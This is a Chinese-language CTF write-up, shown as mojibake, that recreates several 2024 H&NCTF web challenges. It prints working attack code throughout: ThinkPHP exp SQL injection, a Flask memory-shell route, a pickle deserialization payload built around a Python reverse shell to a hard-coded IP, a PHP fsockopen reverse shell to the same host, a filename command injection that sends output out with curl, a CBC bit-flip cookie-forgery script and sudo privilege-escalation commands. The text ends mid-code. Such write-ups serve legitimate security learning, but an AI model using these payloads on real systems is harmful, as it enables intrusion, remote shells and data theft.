è·å–POSTå‚æ•°nameï¼Œä½¿ç”¨trimå‡½æ•°è¿‡æ»¤ $name = I('post.name', '', 'trim'); // è·å–COOKIEå‚æ•°nameï¼Œä¸å­˜åœ¨æ—¶é»˜è®¤ä¸ºç©ºå­—ç¬¦ä¸² $name = I('cookie.name', ''); // è·å–ä»»æ„ç±»å‹çš„å‚æ•°nameï¼Œä¼˜å…ˆçº§ä¸ºGETã€POSTã€COOKIE $name = I('name'); æˆ‘ä»¬ç›´æ¥æ‰¾åˆ°tp3.2.3åŸç‰ˆ exp æ³¨å…¥ä½ç½®ThinkPHP/Library/Think/Db/Driver.class.php å¯ä»¥çœ‹åˆ°è¿™é‡Œå…ˆæ˜¯åˆ¤æ–­ä¼ å…¥çš„valå‚æ•°æ˜¯å¦ä¸ºæ•°ç»„ï¼Œç„¶åè¿™é‡Œæˆ‘ä»¬å°†valç¬¬ä¸€ä¸ªå…ƒç´ èµ‹å€¼ä¸ºexpï¼Œåˆ™å°±ä¼šè¿›å…¥çº¢æ¡†ä¸­çš„elseifè¯­å¥å—ï¼Œè¿™é‡Œçš„whereStrå‚æ•°ç›´æ¥æ‹¼æ¥äº†keyå‚æ•°+ç©ºæ ¼+valæ•°ç»„çš„ç¬¬äºŒä¸ªå…ƒç´  å¦‚æœæˆ‘ä»¬è¿™æ ·æ„é€  ?name[0]=exp&amp;name[1]==1 and test//è¿™é‡Œçš„å€¼å«æœ‰ç­‰äºå· å…¶ä¸­ä¸Šè¿°ä»£ç çš„keyå°±æ˜¯è¿™é‡Œçš„usernameï¼Œæœ€ç»ˆå°±æ˜¯è¿™ä¸ªè¯­å¥ username = 1 and test ç›´æ¥unionæ³¨å…¥å³å¯ WEB-ezFlask æ ¹æ®æç¤ºï¼Œç›´æ¥è®¿é—®çš„è¯ï¼Œå‘ç°405ï¼šè®¿é—®æ–¹æ³•ä¸è¢«å…è®¸ï¼ŒçŒœæµ‹éœ€è¦çš„æ˜¯postç»™cmdä¼ å‚ æœ€ç»ˆpayloadä¸ºï¼šæœ€åè®¿é—®shellè·¯ç”±å³å¯ app.add_url_rule('/shell','shell',lambda:__import__('os').popen('cat /flag').read()) è¿™é‡Œèµ›åçœ‹äº†wpï¼Œè€ƒä¸€ä¸ªflaskå†…å­˜é©¬ï¼Œå¾ˆå¥½ï¼Œæ²¡å­¦è¿‡ã€‚æ¥ä¸‹æ¥ç®€å•å­¦å­¦ã€‚ WEB-GPTS è¿™é“é¢˜æ¯”èµ›æ—¶å€™ä¹Ÿæ²¡çœ‹ï¼Œèµ›åçœ‹äº†wpå‘ç°å¾ˆæœ‰æ„æ€ã€‚ å¦‚ä¸Šå›¾ï¼Œå¯¹äºä¿¡æ¯æœé›†ï¼Œè‚¯å®šåŸºæœ¬ç”¨googleï¼Œè¿™é‡Œè‚¯å®šè¦æ‰¾åˆ°å…³é”®è¯æ‰å¯ä»¥ï¼Œç”±äºè¿™é‡Œåœ¨å¤ç°ï¼Œä¹Ÿä¸æƒ³ç€æµªè´¹å¤ªå¤šæ—¶é—´ã€‚ æˆ‘é¦–å…ˆæ˜¯æŸ¥çœ‹äº†æºç ï¼Œå‘ç°å­˜åœ¨gradio_appçš„å…³é”®è¯ï¼Œæœäº†æœï¼Œä½†æ²¡æœ‰ç›¸å…³æ¼æ´ï¼Œä¹‹åä¹Ÿå°è¯•äº†ä¸­æ–‡å…³é”®è¯ä¹‹ç±»çš„ï¼Œä¹Ÿæ˜¯æ²¡å•¥ç”¨ã€‚æ€»ä½“çœ‹äº†çœ‹wpï¼Œæ„Ÿè§‰æ˜¯gpt_academicå…³é”®è¯ï¼Œæˆ‘ä»¬å¯ä»¥æŸ¥çœ‹æºç æœä¸€ä¸‹ ä¹Ÿæ˜¯å‘ç°çœŸçš„å­˜åœ¨ç›¸å…³çš„å…³é”®å­—ï¼Œgoogleä¸€æœå°±å‡ºæ¥äº†ï¼špickleååºåˆ—åŒ–â€”â€”åŸºäºcookieçš„æ»¥ç”¨ï¼ˆå·®ä¸å¤šè¿™ä¸ªæ„æ€ï¼‰ å›è¿‡å¤´æ¥åˆ†æï¼Œåšä¿¡æ¯æœé›†çš„æ—¶å€™ï¼Œå¯ä»¥å¤šæƒ³ä¸€ä¸‹æ˜¯å¦æ˜¯å·²ç»æœ‰è¿‡çš„githubé¡¹ç›®ä¹‹ç±»çš„ï¼Œæˆ–è€…æ˜¯ä¸€äº›ä¸“ä¸šæœ¯è¯­ï¼Œä¸€çœ‹å°±æ˜¯æŸç±»äº§å“æˆ–è€…æ˜¯é¡¹ç›®çš„åå­—ï¼Œè¿™æ ·å»æœç´¢å¯èƒ½æ€§é«˜ä¸€ç‚¹ã€‚ é‚£åšäº†ä¿¡æ¯æœé›†ï¼Œæˆ‘ä»¬ä¸éš¾æœåˆ°è¿™ä¸€ç¯‡æ–‡ç« ï¼šCVE-2024-31224 RCE åˆ†æ å…¶ä¸­æ¼æ´ç‚¹åœ¨ä¸Šé¢è¿™é‡Œï¼šä¸»è¦å°±æ˜¯å¯¹äºcookieçš„å¤„ç†ï¼Œå¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œpickleåºåˆ—åŒ–ï¼Œç„¶åbase64åŠ å¯†ï¼Œç„¶ååœ¨è§£æcookieçš„æ—¶å€™ï¼Œå…ˆè¿›è¡Œbase64è§£å¯†ï¼Œç„¶åloadsè¿›è¡Œpickeååºåˆ—åŒ–ï¼Œå¾ˆæ˜æ˜¾è¿™é‡Œå¯¹å‚æ•°ä¹Ÿæ²¡æœ‰è¿›è¡Œä»»ä½•è¿‡æ»¤ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥RCEï¼ˆå‰æå°±æ˜¯å‚æ•°då¯æ§ï¼‰ è¿™é‡Œå¯¹äºæ˜¯å¦å¯æ§çš„åˆ†æï¼Œæˆ‘å°±ç›´æ¥æˆªå›¾äº† è§£é‡Šä¸€ä¸‹ï¼šè¿™é‡Œæ˜¯é‚£ä½å¸ˆå‚…è·Ÿè¿›è¿™ä¸ªfrom_cookie_strå‡½æ•°ï¼Œçœ‹è°è°ƒç”¨äº†è¿™ä¸ªï¼ˆè¿™æ ·å¯ä»¥çœ‹åˆ°å‚æ•°dçš„æ¥æºï¼‰ï¼Œä¸Šå›¾å°±èƒ½çœ‹åˆ°è¿™é‡Œå‚æ•°dæ˜¯æ¥æºäºå‚æ•°presistent_cookie_ï¼Œä½†æ²¡æœ‰æ›´å…·ä½“çš„äº†ï¼Œå› æ­¤è¿™ä½å¸ˆå‚…çŒœæµ‹è¿™ä¸ªå‚æ•°å°±æ˜¯ä¸ç”¨æˆ·çš„æŸäº›æ“ä½œæœ‰å…³ï¼Œäºæ˜¯æ­å»ºäº†é¡¹ç›®ï¼Œè¿›è¡Œå®è·µã€‚ æˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥åœ¨é¶åœºä¸­ï¼Œæ‰¾åˆ°è‡ªå®šä¹‰æŒ‰é’®è¿™ä¸ªåŠŸèƒ½åŒºè¿›è¡ŒéªŒè¯ å¯ä»¥çœ‹åˆ°æˆ‘ä»¬åœ¨æ²¡æœ‰ä½¿ç”¨è‡ªå®šä¹‰èœå•åŠŸèƒ½çš„æ—¶å€™ï¼Œåªæœ‰ä¸€ä¸ªcookieï¼ˆè¿™æ˜¯é¶åœºè‡ªå¸¦çš„ï¼‰ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬æŒ‰ç…§ä¸‹å›¾ï¼Œéšä¾¿æä¸€ä¸ªè‡ªå®šä¹‰æŒ‰é’®ï¼Œä¹‹åå†æ¬¡æŸ¥çœ‹å°±å‘ç°å¤šäº†ä¸€ä¸ªcookieï¼Œè¿™é‡Œå¸ˆå‚…åˆ†æè¯´æ˜¯ï¼Œé’ˆå¯¹è¿™ä¸ªå‚æ•°ï¼Œé¡¹ç›®ä¸­æ²¡æœ‰è¿›è¡Œä»»ä½•è¿‡æ»¤ï¼Œå› æ­¤å¯ä»¥ç²¾å¿ƒæ„é€ è¿›è¡ŒRCE æˆ‘ä»¬ä»¿ç…§æºç è¿›è¡Œæ‰‹æ“opcode æˆ‘ä»¬å…ˆå‡†å¤‡å¥½payload python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"124.220.233.26\",5555));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"bash\")' //è¿›è¡Œbase64ç¼–ç  cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMTI0LjIyMC4yMzMuMjYiLDU1NTUpKTtbb3MuZHVwMihzLmZpbGVubygpLGYpZm9yIGYgaW4oMCwxLDIpXTtwdHkuc3Bhd24oInNoIikn import pickle import base64 def from_cookie_str(c): pickled_dict = base64.b64decode(c.encode(\"utf-8\")) return pickle.loads(pickled_dict) opcode = b'''cos system (S'bash -c \"{cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMTI0LjIyMC4yMzMuMjYiLDU1NTUpKTtbb3MuZHVwMihzLmZpbGVubygpLGYpZm9yIGYgaW4oMCwxLDIpXTtwdHkuc3Bhd24oInNoIikn}|{base64,-d}|{bash,-i}\"' tR.''' opcode = base64.b64encode(opcode).decode('utf-8') print(opcode) ä¿®æ”¹cookieä¸ºç”Ÿæˆçš„æ•°æ®ï¼Œä¹‹åï¼Œé‡æ–°åŠ è½½é¡µé¢ï¼Œç„¶åç‚¹å‡»è‡ªå®šä¹‰æŒ‰é’®çš„â€œç¡®è®¤å¹¶ä¿å­˜â€æˆ–è€…â€œåŠ è½½å·²ä¿å­˜â€æŒ‰é’®å³å¯å®ç°RCE æ¥ä¸‹æ¥å°±æ˜¯ææƒäº†ã€‚ã€‚ã€‚æœ‰ç‚¹ä¸ä¼š é¦–å…ˆç¡®å®šäº†å½“å‰ç”¨æˆ·æ˜¯ctfgameï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹è¯¥ç”¨æˆ·èƒ½å¤Ÿè¯»å–é‚£äº›æ–‡ä»¶ find / -type f -user ctfgame -readable 2&gt;/dev/null å¯»æ‰¾ä¸€ç•ªä¸‹æ¥å‘ç°å°±ä¸‹å›¾è¿™ä¸ªmailæ–‡ä»¶å¾ˆæ˜¾çœ¼ è¯»å–å‘ç°æˆ‘ä»¬èƒ½å¤Ÿç™»å½•ctferè¿™ä¸ªç”¨æˆ· è¿™é‡Œè¯´æ˜äº†æˆ‘ä»¬å½“å‰çš„ç”¨æˆ·å¯ä»¥åœ¨ä¸éœ€è¦å¯†ç çš„æƒ…å†µä¸‹ï¼Œè¿è¡Œadduserçš„å‘½ä»¤ï¼Œé‚£æˆ‘ä»¬å°è¯•åˆ›å»ºä¸€ä¸ªç”¨æˆ·ï¼ˆå…¶å®è¿™é‡Œåº”è¯¥æ˜¯å°è¯•åˆ›å»ºrootç”¨æˆ·ï¼Œä½†è¿™ä¸å¯èƒ½ï¼Œå› ä¸ºå·²ç»æœ‰äº†rootç”¨æˆ·ï¼Œå› æ­¤æˆ‘ä»¬æƒ³è¦çš„æ˜¯åˆ›å»ºä¸€ä¸ªå±äºrootç”¨æˆ·ç»„çš„ç”¨æˆ·ï¼‰ï¼Œå‘½ä»¤å¦‚ä¸‹ sudo adduser test -gid=0 å¦‚ä¸Šå›¾ï¼Œæˆ‘ä»¬æˆåŠŸåˆ›å»ºï¼Œä½†æˆ‘ä»¬å‘ç°ä¾æ—§ä¸èƒ½è®¿é—®rootç›®å½• è¿™é‡Œå‘ç°ä¸€ä¸ªsudoersæ–‡ä»¶ï¼Œä½†ä¸æ˜¯ä¸€ä¸ªå¸¸è§„çš„linuxæ–‡ä»¶ï¼Œè¿™é‡Œå‘ç°kobeç”¨æˆ·èƒ½å¤Ÿä½¿ç”¨apt-getå‘½ä»¤ï¼Œæœç´¢ä¸€ä¸‹æ˜¯å¦èƒ½ææƒ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh å¦å¤–æœ‰ä¸¤ä¸ªpickleååºåˆ—åŒ–å†™çš„å¥½çš„æ–‡ç« ï¼š Pickleååºåˆ—åŒ–ã€æœ€è¿‘ç¢°åˆ°çš„ Python pickle ååºåˆ—åŒ–å°æ€»ç»“ WEB-flippin from flask import Flask, request, abort from Crypto.Cipher import AES from Crypto.Random import get_random_bytes from Crypto.Util.Padding import pad, unpad from flask import Flask, request, Response from base64 import b64encode, b64decode import json default_session = '{\"admin\": 0, \"username\": \"user1\"}' key = get_random_bytes(AES.block_size) def encrypt(session): iv = get_random_bytes(AES.block_size) cipher = AES.new(key, AES.MODE_CBC, iv) return b64encode(iv + cipher.encrypt(pad(session.encode('utf-8'), AES.block_size))) def decrypt(session): raw = b64decode(session) cipher = AES.new(key, AES.MODE_CBC, raw[:AES.block_size]) try: res = unpad(cipher.decrypt(raw[AES.block_size:]), AES.block_size).decode('utf-8') return res except Exception as e: print(e) app = Flask(__name__) filename_blacklist = { 'self', 'cgroup', 'mountinfo', 'env', 'flag' } @app.route(\"/\") def index(): session = request.cookies.get('session') if session is None: res = Response( \"welcome to the FlipPIN server try request /hint to get the hint\") res.set_cookie('session', encrypt(default_session).decode()) return res else: return 'have a fun' @app.route(\"/hint\") def hint(): res = Response(open(__file__).read(), mimetype='text/plain') return res @app.route(\"/read\") def file(): session = request.cookies.get('session') if session is None: res = Response(\"you are not logged in\") res.set_cookie('session', encrypt(default_session)) return res else: plain_session = decrypt(session) if plain_session is None: return 'don\\'t hack me' session_data = json.loads(plain_session) if session_data['admin'] : filename = request.args.get('filename') if any(blacklist_str in filename for blacklist_str in filename_blacklist): abort(403, description='Access to this file is forbidden.') try: with open(filename, 'r') as f: return f.read() except FileNotFoundError: abort(404, description='File not found.') except Exception as e: abort(500, description=f'An error occurred: {str(e)}') else: return 'You are not an administrator' if __name__ == \"__main__\": app.run(host=\"0.0.0.0\", port=9091, debug=True) ä¸€é“è®¡ç®—flask pinçš„é¢˜ç›®ï¼Œæˆ‘ä»¬å…ˆåˆ†æä»£ç ï¼Œé¦–å…ˆæ˜¯é’ˆå¯¹sessionçš„åŠ è§£å¯†ï¼Œå…¶ä¸­ç”¨çš„æ˜¯aesç®—æ³•ï¼Œç„¶åå°±æ˜¯çœ‹readè·¯ç”±ï¼Œå¦‚æœåˆ¤æ–­æˆ‘ä»¬çš„sessionä¸­adminå€¼ä¸º1ï¼Œæˆ‘ä»¬å°±èƒ½å®ç°ä»»æ„æ–‡ä»¶è¯»å–ï¼Œå¹¶ä¸”å†è¯»å–ä¹‹å‰ï¼Œä¼šåˆ¤æ–­æˆ‘ä»¬è¾“å…¥çš„filenameå‚æ•°å†…å®¹æ˜¯å¦åœ¨é»‘åå•ä¸Šé¢ï¼Œä¸åœ¨çš„è¯å°±èƒ½è¯»å–äº† è¿™é“é¢˜å½“åˆè‚¯å®šå°±è§‰å¾—åŠ å¯†è¿™ä¸€å—å„¿æœ‰é—®é¢˜ï¼Œä½†æœäº†åŠå¤©ä¹Ÿæ²¡ç»“æœï¼Œçœ‹äº†wpæ˜¯è¦æ‰“cbcç¿»è½¬ï¼ˆæ²¡å¬è¿‡ã€‚ã€‚ã€‚ï¼‰ æ‰¾åˆ°äº†ç›¸å…³è§£é‡Šçš„æ–‡ç« ï¼šhttps://blog.csdn.net/V1040375575/article/details/111773524 CBCå­—èŠ‚ç¿»è½¬æ”»å‡»&amp;Padding Oracle AttackåŸç†è§£æâ€”â€”è¿™ä¸ªæ„Ÿè§‰è®²çš„æ¸…æ™° å°±æ˜¯æ ¹æ®åŠ è§£å¯†åŸç†å»è¿›è¡ŒæŸä¸ªä½ç½®å¯¹åº”çš„æŸä¸ªå­—ç¬¦çš„ç¿»è½¬ï¼Œå¯¹äºè¿™é“é¢˜ç›®ï¼Œå°±æ˜¯ç¿»è½¬0æˆä¸º1ï¼Œå³å¯ç»•è¿‡ï¼Œç›´æ¥è„šæœ¬å°å­äº† import requests from base64 import b64decode, b64encode url = \"http://hnctf.yuanshen.life:34468/\" default_session = '{\"admin\": 0, \"username\": \"guest\"}' res = requests.get(url) c = bytearray(b64decode(res.cookies[\"session\"])) c[default_session.index(\"0\")] ^= 1 evil = b64encode(c).decode() filename = \"/etc/passwd\" url_attack = url + f\"read?filename={filename}\" res = requests.get(url_attack, cookies={\"session\": evil}) print(res.text) è¿™é‡Œå°±æ˜¯å…ˆbase64è§£å¯†ï¼Œç„¶åè½¬æ¢æˆå­—èŠ‚æ•°ç»„ï¼Œä¹‹åç”¨indexå–è¯¥æ•°ç»„ä¸­çš„å­—èŠ‚0ï¼Œä¸1 xor å¾—åˆ°1ï¼Œæœ€ç»ˆè¿˜åŸå›å»ï¼ŒæˆåŠŸä¼ªé€ cookie è¿™é‡Œå¾—åˆ°ç”¨æˆ·åä¸ºctfUserï¼Œä¸‹å›¾æ˜¯æ ¹æ®ä»£ç çš„æŠ±é”™éƒ¨åˆ†å¾—çŸ¥ï¼Œè®¿é—®readè·¯ç”±ï¼Œæ„é€ æ— æ•ˆcookieå³å¯æŠ±é”™ï¼Œå¾—åˆ°ç»å¯¹è·¯å¾„ /usr/lib/python3.9/site-packages/flask/app.py è¯»å–machine-idå¾—åˆ°ï¼š02:42:ac:11:00:06 è¿™é‡ŒçŒœæµ‹æ˜¯dockerå®¹å™¨ï¼Œæ‰€ä»¥éœ€è¦è¯»å–è¿™ä¸¤ä¸ªä½ç½® /proc/sys/kernel/random/boot_id /proc/self/cgroup //ä½†è¿™ä¸ªè¢«é»‘åå•è¿‡æ»¤äº†éƒ¨åˆ†å­—ç¬¦ //ç™¾åº¦ä¸€ä¸‹å°±èƒ½çŸ¥é“å¦‚ä½•ç»•è¿‡ /proc/1/mountinfo è¿‡æ»¤äº†selfå…¶ä¸­çš„selfå¯ä»¥ç”¨ç›¸å…³è¿›ç¨‹çš„pidå»æ›¿æ¢,å…¶å®1å°±è¡Œ è¿‡æ»¤äº†cgroupï¼Œç”¨mountinfoæˆ–è€…cpuset æœ€åè¯»å–ç¯å¢ƒå˜é‡ å‚è€ƒæ–‡ç«  flaskè®¡ç®—pinç  2024 H&amp;NCTF éƒ¨åˆ†é¢˜ç›®å¤ç° WEB-å¥‡æ€ªçš„ç½‘ç«™ ä¸çœ‹wpè¿˜çœŸå°±çœ¼çäº†ï¼ŒçœŸçœ‹ä¸å‡ºæ¥å­˜åœ¨302ï¼Œä¸æŠ“åŒ…çœ‹éƒ½ä¸è¡Œå•Š å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œçœ‹åˆ°äº†vimå¼‚å¸¸çš„æç¤ºï¼Œè¯´æ˜å­˜åœ¨vimç¼“å­˜æ–‡ä»¶æ³„éœ² æ¥ç€æ‰«ç›®å½•å‘ç°å­˜åœ¨ä»¥ä¸‹ä¸¤ä¸ªæ–‡ä»¶ï¼ŒçŒœæµ‹å°±æ˜¯flag.phpå¼‚å¸¸é€€å‡ºï¼Œæˆ‘ä»¬è®¿é—®çœ‹çœ‹ å‘ç°å½“è®¿é—®åˆ°.flag.php.swmçš„æ—¶å€™ï¼Œå¾—åˆ°å¼‚å¸¸æ–‡ä»¶ï¼Œç›´æ¥vim -r æ¢å¤ä¸€ä¸‹å³å¯ /* you find me! */ function check($num) { $a = ord('1'); $b = ord('9'); for ($i = 0; $i &lt; strlen($num); $i++) { $c = ord($num{$i}); if ( ($c &gt;= $a) &amp;&amp; ($c &lt;= $b) ) { return false; } } return $num == '11259375'; } $num = $_GET['num']; è¿™é‡Œæ„æ€æ˜¯ï¼Œä½ è¾“å…¥çš„numä¸èƒ½ä¸ºæ•°å­—1-9ï¼Œä½†æœ€åè¿˜è¦ç­‰äº11259375ï¼Œè¿™é‡Œå¯ä»¥æƒ³åˆ°åå…­è¿›åˆ¶ç»•è¿‡ è¿™é‡Œåˆæç¤ºæˆ‘ä»¬å»é¦–é¡µçœ‹çœ‹ã€‚ã€‚ã€‚ è¿™ä»¤æˆ‘å¾ˆå°´å°¬ï¼Œå¿˜è®°å…³æ³¨403çš„æ–‡ä»¶äº†ï¼Œè¿™ä¹Ÿè¯´æ˜è¯¥æ–‡ä»¶æ˜¯å­˜åœ¨çš„ã€‚æ‰«ç›®å½•å‘ç°å­˜åœ¨.htaccessæ–‡ä»¶ï¼ŒåŒæ—¶çœ‹äº†wpæ‰çŸ¥é“ï¼Œé¦–é¡µurlåé¢æ˜¯index.pngï¼Œè¯´æ˜å›¾ç‰‡è¢«å½“æˆphpè§£æäº†ï¼Œè¯æ˜å­˜åœ¨.htaccessæ–‡ä»¶é…ç½®è§£æé”™è¯¯ è®¿é—®404.phpï¼Œçœ‹åˆ°httpå“åº”å¤´æœ‰ä¸ªæç¤ºï¼šPUTä¹‹åï¼ŒæœåŠ¡å™¨æ˜¯å¦ç›´æ¥å†™å…¥æ–‡ä»¶ï¼Ÿpreflightï¼Ÿ è¿™é‡Œå®˜æ–¹wpè¯´çš„æ˜¯ï¼š è€ƒå¯Ÿ å°è¯•æ›´æ”¹methodæ–¹æ³•ä¸º OPTIONS ï¼Œå¯ä»¥åˆ©ç”¨æ–‡ä»¶è¯»å–æ¼æ´ï¼Œè¯»å–.htaccessæ–‡ä»¶éšè—æ–‡ä»¶ggggoku.phpï¼Œè¿›è¡Œrce ä½†æˆ‘å®åœ¨æ˜¯ä¸çŸ¥é“å¦‚ä½•è¯»å–ã€‚ã€‚ã€‚å…ˆè·³è¿‡å§ï¼Œé—®ä¸€äº›å¸ˆå‚…å†è¯´ ggggoku.php?a=${eval($_POST[0])} 0=$sock=fsockopen(\"124.220.233.26\",5555);popen(\"bash &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\", \"r\");//è¿™é‡Œéœ€è¦urlç¼–ç  ä¹‹åå°±æ˜¯å¸¸è§„ææƒï¼Œæˆ‘çš„ææƒç»éªŒå°±å¾ˆå°‘äº†ï¼Œå®Œå…¨é wp å…ˆæ˜¯findæŸ¥æ‰¾suidæ˜¯å¦èƒ½ææƒï¼Œè¿™é‡Œå‘ç°su suï¼šã€å…¨ç§°switch userã€‘èº«ä»½åˆ‡æ¢ï¼Œä½¿ç”¨æ™®é€šç”¨æˆ·ç™»å½•ï¼Œç„¶åä½¿ç”¨suå‘½ä»¤åˆ‡æ¢åˆ°root ä¼˜ç‚¹:ç®€å• ç¼ºç‚¹:éœ€è¦çŸ¥é“rootå¯†ç  ä¹Ÿå°±æ˜¯è¯´ï¼ŒçŸ¥é“äº†rootå¯†ç å°±å¯ä»¥äº†ï¼Œé‚£å°±éœ€è¦ä¿¡æ¯æœé›†ä¸€ä¸‹ï¼Œå‘ç°/home/adminç›®å½•ä¸‹å­˜åœ¨passwdï¼Œè¯´æ˜¯å¯†ç å°±æ˜¯gokuçš„MD5å€¼ã€‚ ä½†çŸ¥é“äº†å¯†ç ï¼Œè¿è¡Œsuå´ä¸è¡Œï¼Œå› ä¸ºè¿™ä¸æ˜¯äº¤äº’å¼shellï¼Œè¿™é‡Œè¯´å¿…é¡»åœ¨ä¸€ä¸ªç»ˆç«¯è¿è¡Œï¼Œä¹Ÿå°±æ˜¯äº¤äº’å¼shell googleä¸€æ‰‹ï¼Œ å‘ç°å¯ä»¥é€šè¿‡scriptè„šæœ¬å®ç° /usr/bin/script -qc /bin/bash /dev/null åˆ‡æ¢åˆ°rootä¹‹åï¼Œè¯»å–å³å¯ WEB-GoJava æ‰«ç›®å½•å‘ç°ä¸¤ä¸ªæ–‡ä»¶ï¼Œè®¿é—®çœ‹çœ‹ï¼Œè¿™é‡Œmain.goæ˜¾ç¤ºæ— æƒè®¿é—®ï¼Œè®¿é—®å¦ä¸€ä¸ªzipå¾—åˆ°éƒ¨åˆ†æºç  package main import ( \"io\" \"log\" \"mime/multipart\" \"net/http\" \"os\" \"strings\" ) var blacklistChars = []rune{'&lt;', '&gt;', '\"', '\\'', '\\\\', '?', '*', '{', '}', '\\t', ' ', '\\r'} func main() { // è®¾ç½®è·¯ç”± http.HandleFunc(\"/gojava\", compileJava) // è®¾ç½®é™æ€æ–‡ä»¶æœåŠ¡å™¨ fs := http.FileServer(http.Dir(\".\")) http.Handle(\"/\", fs) // å¯åŠ¨æœåŠ¡å™¨ log.Println(\"Server started on :80\") log.Fatal(http.ListenAndServe(\":80\", nil)) } func isFilenameBlacklisted(filename string) bool { for _, char := range filename { for _, blackChar := range blacklistChars { if char == blackChar { return true } } } return false } func compileJava(w http.ResponseWriter, r *http.Request) { // æ£€æŸ¥è¯·æ±‚æ–¹æ³•æ˜¯å¦ä¸ºPOST if r.Method != http.MethodPost { http.Error(w, \"Method not allowed\", http.StatusMethodNotAllowed) return } // è§£æmultipart/form-dataæ ¼å¼çš„è¡¨å•æ•°æ® err := r.ParseMultipartForm(10 &lt;&lt; 20) // è®¾ç½®æœ€å¤§æ–‡ä»¶å¤§å°ä¸º10MB if err != nil { http.Error(w, \"Error parsing form\", http.StatusInternalServerError) return } // ä»è¡¨å•ä¸­è·å–ä¸Šä¼ çš„æ–‡ä»¶ file, handler, err := r.FormFile(\"file\") if err != nil { http.Error(w, \"Error retrieving file\", http.StatusBadRequest) return } defer file.Close() if isFilenameBlacklisted(handler.Filename) { http.Error(w, \"Invalid filename: contains blacklisted character\", http.StatusBadRequest) return } if !strings.HasSuffix(handler.Filename, \".java\") { http.Error(w, \"Invalid file format, please select a .java file\", http.StatusBadRequest) return } err = saveFile(file, \"./upload/\"+handler.Filename) if err != nil { http.Error(w, \"Error saving file\", http.StatusInternalServerError) return } } func saveFile(file multipart.File, filePath string) error { // åˆ›å»ºç›®æ ‡æ–‡ä»¶ f, err := os.Create(filePath) if err != nil { return err } defer f.Close() // å°†ä¸Šä¼ çš„æ–‡ä»¶å†…å®¹å¤åˆ¶åˆ°ç›®æ ‡æ–‡ä»¶ä¸­ _, err = io.Copy(f, file) if err != nil { return err } return nil } é€»è¾‘ä¹Ÿç®€å•ï¼Œæœ‰ä¸€ä¸ªé»‘åå•ï¼Œç„¶åå¼€äº†ä¸ªæœåŠ¡å™¨ã€‚å…ˆåˆ¤æ–­è¯·æ±‚è®¿é—®æ˜¯å¦ä¸ºpostï¼Œå¦åˆ™æ˜¯æ— æ•ˆçš„ï¼Œä¹‹åè·å–ä¸Šä¼ çš„æ–‡ä»¶ï¼ŒéªŒè¯æ–‡ä»¶åç§°æ˜¯å¦åŒ…å«äº†é»‘åå•ï¼Œè§„å®šæ–‡ä»¶åç¼€å¿…é¡»ä¸º.javaï¼Œç„¶åè°ƒç”¨savefileä¿å­˜æ–‡ä»¶ è¿™é‡Œç¬¬ä¸€æ¬¡é‡è§æ–‡ä»¶ä¸Šä¼ çš„æ–‡ä»¶åfilenameè¿›è¡ŒRCEï¼ˆè¿™é‡Œå¯èƒ½å°±æ˜¯å› ä¸ºé»‘åå•å¤„ç†è€Œè”æƒ³åˆ°çš„ï¼‰è‡³äºåŸç†æˆ‘è¿˜ä¸æ‡‚ï¼Œæœ‰çš„å¸ˆå‚…æ˜¯è¿™æ ·ç†è§£çš„ï¼š å°±æ˜¯çŒœæµ‹å¼€å‘ java ç¼–è¯‘è¿™ä¸ªåŠŸèƒ½æ˜¯ä½¿ç”¨å‘½ä»¤ç¼–è¯‘çš„åé¢å¯ä»¥å‘½ä»¤æ‹¼æ¥ çœ‹å®˜æ–¹wpç»™çš„payloadï¼š filename=\"a.java||curl -X POST -d a=`whoami` [Your-IP]:8888||.java\" å¯ä»¥çœ‹åˆ°å›æ˜¾ var blacklistChars = []rune{'&lt;', '&gt;', '\"', '\\'', '\\\\', '?', '*', '{', '}', '\\t', ' ', '\\r'} é»‘åå•å¦‚ä¸Šï¼Œæ— æ³•åå¼¹shellè¿›è¡ŒRCEï¼Œåªèƒ½ä¸€æ¬¡æ¬¡çœ‹å›æ˜¾ï¼Œè¿™é‡Œç”¨base64çš„åŸå› å°±åœ¨äºï¼Œæƒ³è®©å›æ˜¾çš„å†…å®¹åœ¨ä¸€è¡Œå½“ä¸­æ˜¾ç¤ºå‡ºæ¥ï¼Œå¦åˆ™åªæœ‰ä¸ªlsï¼Œåªèƒ½æ˜¾ç¤ºå‡ºæ•°æ®çš„ç¬¬ä¸€è¡Œ css final go.mod gojava index.html js main-old.zip main.go robots.txt upload ä¹‹åæŸ¥çœ‹main.go package main import ( \"fmt\" \"io\" \"log\" \"math/rand\" \"mime/multipart\" \"net/http\" \"os\" \"os/exec\" \"path/filepath\" \"strconv\" \"strings\" \"time\" ) var blacklistChars = []rune{'&lt;', '&gt;', '\"', '\\'', '\\\\', '?', '*', '{', '}', '\\t', ' ', '\\r'} func main() { // è®¾ç½®è·¯ç”± http.HandleFunc(\"/gojava\", compileJava) http.HandleFunc(\"/testExecYourJarOnServer\", testExecYourJarOnServer) // è®¾ç½®é™æ€æ–‡ä»¶æœåŠ¡å™¨ fs := http.FileServer(http.Dir(\".\")) http.Handle(\"/\", http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { // æ£€æŸ¥è¯·æ±‚çš„è·¯å¾„æ˜¯å¦éœ€è¦è¢«ç¦æ­¢è®¿é—® if isForbiddenPath(r.URL.Path) { http.Error(w, \"Forbidden\", http.StatusForbidden) return } // å¦åˆ™ï¼Œç»§ç»­å¤„ç†å…¶ä»–è¯·æ±‚ fs.ServeHTTP(w, r) })) // å¯åŠ¨æœåŠ¡å™¨ log.Println(\"Server started on :80\") log.Fatal(http.ListenAndServe(\":80\", nil)) } func isForbiddenPath(path string) bool { // æ£€æŸ¥è·¯å¾„æ˜¯å¦ä¸ºæŸä¸ªç‰¹å®šæ–‡ä»¶æˆ–æ–‡ä»¶å¤¹çš„è·¯å¾„ // 